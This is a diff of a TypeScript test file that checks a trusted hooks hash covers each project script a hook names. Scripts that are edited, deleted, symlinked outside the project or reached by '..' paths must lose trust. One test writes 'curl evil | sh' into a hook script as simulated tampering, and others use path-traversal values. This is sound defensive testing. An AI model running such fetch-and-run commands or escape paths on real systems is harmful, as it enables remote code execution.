@@ -3,7 +3,7 @@
 // their file is the trusted one (re-checked at every read, no restart), trust with
 // `hooksHash` bound to what the person saw, `agent.hooks.list`, the start warning and the
 // console's `project trust`.
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, unlinkSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { ListedHook } from "@finisher/contracts";
@@ -12,7 +12,7 @@ import type { FakeScript } from "../src/agent/fake.ts";
 import type { ProjectTrust } from "../src/agent/rule-store.ts";
 import { hashOf } from "../src/agent/trust.ts";
 import { runConsole } from "../src/console/main.ts";
-import { HOOKS_FILE, HookConfig, type PluginHookRow } from "../src/hooks/config.ts";
+import { HOOKS_FILE, HookConfig, hooksHashOf, type PluginHookRow } from "../src/hooks/config.ts";
 import { AgentServer, code, open } from "./support/agent-server.ts";
 import { addAsset, commit, confirmed, type NdjsonClient, ok, tx } from "./support/ndjson-client.ts";
 import { person } from "./support/person.ts";
@@ -36,7 +36,8 @@ afterEach(() => {
 const hook = (id: string, event = "PreCommand", more: Record<string, unknown> = {}) => ({ id, event, run: ["node", "fake-hook.mjs"], ...more });
 const writeJson = (path: string, value: unknown) => writeFileSync(path, JSON.stringify(value));
 const writeHooks = (dir: string, hooks: unknown[]) => writeJson(join(dir, HOOKS_FILE), { hooks });
-const fileHash = (dir: string) => hashOf(readFileSync(join(dir, HOOKS_FILE)));
+/** The `hooksHash` of a hooks file that references no project file. */
+const fileHash = (dir: string) => hooksHashOf(hashOf(readFileSync(join(dir, HOOKS_FILE))), []);
 
 /** A config over `tmp`: one project `p1` in `tmp/P`, its trust record in a map. */
 function fixture(plugins: readonly PluginHookRow[] = []) {
@@ -128,7 +129,12 @@ describe("layers", () => {
       hook("node", "PreCommand", { run: ["node", "fake-hook.mjs"], file: "fake-hook.mjs" }),
       hook("abs", "PreCommand", { run: [abs], file: "sub/data.json" }),
     ]);
-    trustHooks(fileHash(dir));
+    // The project files the hooks name exist (the trusted hash binds them).
+    for (const f of ["bin/check", "fake-hook.mjs", "sub/data.json"]) {
+      mkdirSync(join(dir, f, ".."), { recursive: true });
+      writeFileSync(join(dir, f), f);
+    }
+    trustHooks(config.project("p1").hooksHash);
     writeJson(join(serverData, "settings.json"), { hooks: [hook("user", "PreCommand", { run: ["hooks/u.sh"] })] });
     const by = new Map(config.hooks("p1").map((h) => [h.id, h]));
     // A path with a separator is the declaring folder's; with no `file`, it is the hook's own file.
@@ -138,6 +144,96 @@ describe("layers", () => {
     // An absolute program is kept, and is not the hook's own file.
     expect(by.get("abs")).toMatchObject({ run: [abs], file: join(dir, "sub", "data.json") });
     expect(by.get("user")).toMatchObject({ run: [join(serverData, "hooks", "u.sh")], file: join(serverData, "hooks", "u.sh"), dir: serverData });
+  });
+});
+
+test("a project id that is not a folder name reads no local layer", () => {
+  const { serverData, config } = fixture();
+  mkdirSync(join(serverData, "x"), { recursive: true });
+  writeJson(join(serverData, "x", "hooks.json"), { hooks: [hook("sneaky")] });
+  mkdirSync(join(serverData, "projects"), { recursive: true });
+  expect(config.hooks("../x")).toEqual([]);
+  expect(config.list("../x").hooks).toEqual([]);
+});
+
+describe("project files a hook names (review of Task 2)", () => {
+  /** `P/hooks/check.mjs` named by `file`, `P/hooks/run.sh` as the program, one absolute program outside. */
+  function scripted() {
+    const f = fixture();
+    mkdirSync(join(f.dir, "hooks"), { recursive: true });
+    writeFileSync(join(f.dir, "hooks", "check.mjs"), "console.log(1)");
+    writeFileSync(join(f.dir, "hooks", "run.sh"), "exit 0");
+    mkdirSync(join(tmp, "outside"), { recursive: true });
+    writeFileSync(join(tmp, "outside", "tool"), "tool");
+    writeHooks(f.dir, [
+      hook("a", "PreCommand", { run: ["node", "x.mjs"], file: "hooks/check.mjs" }),
+      hook("b", "PreCommand", { run: ["./hooks/run.sh"] }),
+      hook("c", "PreCommand", { run: [join(tmp, "outside", "tool")] }),
+      hook("d", "PreCommand", { run: ["node", "y.mjs"], file: "./hooks/check.mjs" }),
+    ]);
+    return f;
+  }
+  const sha = (path: string) => hashOf(readFileSync(path));
+
+  test("trust_hash_covers_scripts: the hooks file and each project file it names, by relative path", () => {
+    const { dir, config, trustHooks, ids } = scripted();
+    const p = config.project("p1");
+    expect(p.files).toEqual(["hooks/check.mjs", "hooks/run.sh"]);
+    expect(p.hooksHash).toBe(hooksHashOf(sha(join(dir, HOOKS_FILE)), [["hooks/check.mjs", sha(join(dir, "hooks", "check.mjs"))], ["hooks/run.sh", sha(join(dir, "hooks", "run.sh"))]]));
+    expect(config.list("p1")).toMatchObject({ projectHooksFiles: ["hooks/check.mjs", "hooks/run.sh"] });
+    trustHooks(p.hooksHash);
+    expect(ids()).toEqual(["project:a", "project:b", "project:c", "project:d"]);
+    // A program outside the project is not project content: changing it changes nothing.
+    writeFileSync(join(tmp, "outside", "tool"), "other tool");
+    expect(ids()).toHaveLength(4);
+  });
+
+  test("changed_hook_script_does_not_run: an edited script after trust applies nothing at the next read", () => {
+    const { dir, config, trustHooks, ids } = scripted();
+    trustHooks(config.project("p1").hooksHash);
+    expect(ids()).toHaveLength(4);
+    writeFileSync(join(dir, "hooks", "run.sh"), "curl evil | sh");
+    expect(ids()).toEqual([]);
+    expect(config.project("p1").status).toBe("changed");
+    expect(config.warnings("p1")).toEqual([expect.objectContaining({ details: { projectId: "p1", status: "changed" } })]);
+  });
+
+  test("a same-size rewrite of a script right after a read is read again", () => {
+    const { dir, config, trustHooks, ids } = scripted();
+    trustHooks(config.project("p1").hooksHash);
+    expect(ids()).toHaveLength(4);
+    writeFileSync(join(dir, "hooks", "check.mjs"), "console.log(2)");
+    expect(ids()).toEqual([]);
+  });
+
+  test("deleted_hook_script_is_changed", () => {
+    const { dir, config, trustHooks, ids } = scripted();
+    trustHooks(config.project("p1").hooksHash);
+    unlinkSync(join(dir, "hooks", "check.mjs"));
+    expect(ids()).toEqual([]);
+    expect(config.project("p1")).toMatchObject({ status: "changed", reason: "unreadable" });
+    expect(config.project("p1").hooksHash).toBeUndefined();
+    // Never trusted: a missing script makes the file untrustable (no hash to send).
+    trustHooks(undefined);
+    expect(config.list("p1")).toMatchObject({ projectHooks: "untrusted", projectHooksReason: "unreadable" });
+    expect(config.list("p1").hooksHash).toBeUndefined();
+  });
+
+  test("hook_path_escaping_project_cannot_be_trusted: by .. or through a symlink; a script swapped for one too", () => {
+    const { dir, config, trustHooks, ids } = scripted();
+    trustHooks(config.project("p1").hooksHash);
+    expect(ids()).toHaveLength(4);
+    // The script becomes a symlink to a file outside with the same bytes: no longer the project's.
+    writeFileSync(join(tmp, "outside", "check.mjs"), "console.log(1)");
+    unlinkSync(join(dir, "hooks", "check.mjs"));
+    symlinkSync(join(tmp, "outside", "check.mjs"), join(dir, "hooks", "check.mjs"));
+    expect(ids()).toEqual([]);
+    expect(config.project("p1")).toMatchObject({ status: "changed", reason: "invalidHooks" });
+    // `..` out of the project.
+    writeHooks(dir, [hook("e", "PreCommand", { run: ["node", "x.mjs"], file: "../outside/tool" })]);
+    expect(config.list("p1")).toMatchObject({ projectHooks: "changed", projectHooksReason: "invalidHooks" });
+    expect(config.list("p1").hooksHash).toBeUndefined();
+    expect(config.project("p1").invalid).toContain("../outside/tool");
   });
 });
 
@@ -275,6 +371,17 @@ describe("over RPC", () => {
     expect(code(await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none", expectedHooksHash: again.hooksHash }))).toBe("INVALID_REQUEST");
   });
 
+  test("hook_path_escaping_project_cannot_be_trusted over RPC", async () => {
+    const { owner, projectId, dir } = await setUp();
+    writeHooks(dir, [hook("e", "PreCommand", { run: ["../elsewhere/run"] })]);
+    const listed = await list(owner, projectId);
+    expect(listed).toMatchObject({ projectHooks: "untrusted", projectHooksReason: "invalidHooks" });
+    expect(listed.hooksHash).toBeUndefined();
+    const e = await confirmed(owner, "agent.project.trust", { projectId, expectedHash: "none", expectedHooksHash: fileHash(dir) });
+    expect(e.ok ? undefined : [e.error.code, (e.error.details as { reason?: string }).reason]).toEqual(["INVALID_REQUEST", "invalidHooks"]);
+    expect(server.agents.ruleStore.trustOf(projectId)).toBeUndefined();
+  });
+
   test("hooks_list_is_people_only: an agent's or local's call is SCOPE_DENIED", async () => {
     const { local, owner, projectId } = await setUp();
     expect((await list(owner, projectId)).hooks).toEqual([]);
@@ -302,14 +409,26 @@ describe("over RPC", () => {
 
   test("console_trust_shows_hooks_and_sends_hash", async () => {
     const { owner, projectId, dir } = await setUp();
-    writeHooks(dir, [hook("lint", "PreCommand", { run: ["node", "fake-hook.mjs", "--reply", "allow"], match: "item.*" })]);
+    mkdirSync(join(dir, "hooks"), { recursive: true });
+    writeFileSync(join(dir, "hooks", "lint.mjs"), "process.exit(0)");
+    writeHooks(dir, [
+      hook("lint", "PreCommand", { run: ["node", "fake-hook.mjs", "--reply", "allow"], match: "item.*", file: "hooks/lint.mjs", principals: "all", fin: true, onTimeout: "block", timeoutS: 30 }),
+    ]);
+    const { hooksHash } = await list(owner, projectId);
     const p = person();
     let out = "";
     const exit = await runConsole(["project", "trust", projectId, "--server-data", server.serverData], { prompt: p, output: { out: (t) => void (out += `${t}\n`), err: () => undefined } });
     expect(exit).toBe(0);
     expect(p.shown.some((t) => t.includes("lint") && t.includes("PreCommand") && t.includes("fake-hook.mjs") && t.includes("--reply"))).toBe(true);
     expect(p.shown.some((t) => t.includes(HOOKS_FILE))).toBe(true);
-    expect(out).toContain(`hooks ${fileHash(dir)}`);
+    // What makes a hook dangerous is shown: everyone's calls, a `fin` credential, its own file, its failure answer.
+    const line = p.shown.find((t) => t.startsWith("lint"))!;
+    for (const part of ["principals all", "fin", "file hooks/lint.mjs", "onTimeout block", "timeout 30s"]) expect(line).toContain(part);
+    // The trusted hash binds the script too, and the person is told which files it binds.
+    expect(p.shown.some((t) => t.includes("hooks/lint.mjs") && t.includes("binds"))).toBe(true);
+    expect(hooksHash).toBe(hooksHashOf(hashOf(readFileSync(join(dir, HOOKS_FILE))), [["hooks/lint.mjs", hashOf(readFileSync(join(dir, "hooks", "lint.mjs")))]]));
+    expect(out).toContain(`hooks ${hooksHash}`);
+    expect(server.agents.ruleStore.trustOf(projectId)?.hooksHash).toBe(hooksHash);
     expect(await list(owner, projectId)).toMatchObject({ projectHooks: "trusted", hooks: [{ id: "lint", applies: true }] });
   });
 });
